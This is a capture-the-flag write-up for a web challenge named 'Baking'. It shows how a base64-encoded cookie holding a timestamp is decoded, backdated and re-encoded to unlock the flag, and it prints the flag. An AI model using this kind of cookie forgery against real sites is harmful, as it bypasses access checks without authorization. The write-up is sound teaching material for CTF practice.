# Baking

## Description 
```
Do you know how to make cookies? How about HTTP flavored?
```

## Writeup

Taking a look at the website we find this: <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/2e14a515-55d8-4196-9ca1-ce8a6344bbf1)

Pressing the `Cook` button it seems that we receive a cookie. <br/>
The cookie looks like this: `in_oven:eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzE3LzIwMjMsIDA4OjUyOjUxIn0=`. <br/>

Decoding the cookie:
```sh
kali@kali echo 'eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzE3LzIwMjMsIDA4OjUyOjUxIn0=' | base64 -d                                                   
{"recipe": "Magic Cookies", "time": "10/17/2023, 08:52:51"}
```

Seems like it is normal base64 encoding. Knowing this we can just create a new cookie and reduce the time.
```sh
kali@kali echo '{"recipe": "Magic Cookies", "time": "10/10/2023, 08:52:51"}' | base64
eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzEwLzIwMjMsIDA4OjUyOjUxIn0K
```

Inputing this in the browser again and than reloading the webpage we receive the flag: <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/b30d4eb5-e76b-49cd-93aa-a9d4ab5f7961)

Like this I was able to obtain the flag: `flag{c36fb6ebdbc2c44e6198bf4154d94ed4}`.
